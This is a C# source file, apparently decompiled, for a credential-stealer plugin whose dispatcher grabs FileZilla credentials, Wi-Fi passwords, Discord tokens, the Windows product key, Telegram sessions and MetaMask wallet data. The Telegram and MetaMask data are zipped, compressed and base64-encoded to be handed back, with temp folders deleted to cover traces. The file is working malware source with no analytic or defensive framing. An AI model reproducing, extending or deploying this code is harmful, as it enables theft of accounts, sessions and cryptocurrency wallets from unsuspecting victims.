using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using Ionic.Zip;
using Ionic.Zlib;
using Stealer;

namespace Recovery
{
	// Token: 0x02000006 RID: 6
	internal class Plugin
	{
		// Token: 0x0600000E RID: 14 RVA: 0x00002CB0 File Offset: 0x00000EB0
		public static string RunRecovery(int Method)
		{
			StringBuilder stringBuilder = new StringBuilder();
			string result;
			try
			{
				switch (Method)
				{
				case 0:
					FileZillaGrab.Recovery(stringBuilder);
					result = stringBuilder.ToString();
					break;
				case 1:
					WifiGrab.Recovery(stringBuilder);
					result = stringBuilder.ToString();
					break;
				case 2:
					result = Discord.t0ken();
					break;
				case 3:
					result = ProductKey.GetProductKey();
					break;
				case 4:
				{
					string text = Path.GetTempPath() ?? "";
					Telegram.GetTelegramSessions(text);
					using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
					{
						zipFile.ParallelDeflateThreshold = -1L;
						zipFile.UseZip64WhenSaving = Zip64Option.Always;
						zipFile.CompressionLevel = Ionic.Zlib.CompressionLevel.Default;
						zipFile.AddDirectory(text);
						zipFile.Save(text + ".zip");
						Directory.Delete(text, true);
					}
					result = Convert.ToBase64String(Plugin.Compress(File.ReadAllBytes(text + ".zip")));
					break;
				}
				case 5:
				{
					string text2 = Path.GetTempPath() + "MetaMask";
					MetaMask.Meta(text2);
					using (ZipFile zipFile2 = new ZipFile(Encoding.GetEncoding("cp866")))
					{
						zipFile2.ParallelDeflateThreshold = -1L;
						zipFile2.UseZip64WhenSaving = Zip64Option.Always;
						zipFile2.CompressionLevel = Ionic.Zlib.CompressionLevel.Default;
						zipFile2.AddDirectory(text2);
						zipFile2.Save(text2 + ".zip");
						Directory.Delete(text2, true);
					}
					result = Convert.ToBase64String(Plugin.Compress(File.ReadAllBytes(text2 + ".zip")));
					break;
				}
				default:
					result = null;
					break;
				}
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002ED8 File Offset: 0x000010D8
		public static byte[] Compress(byte[] input)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				byte[] bytes = BitConverter.GetBytes(input.Length);
				memoryStream.Write(bytes, 0, 4);
				using (System.IO.Compression.GZipStream gzipStream = new System.IO.Compression.GZipStream(memoryStream, System.IO.Compression.CompressionMode.Compress))
				{
					gzipStream.Write(input, 0, input.Length);
					gzipStream.Flush();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}
}
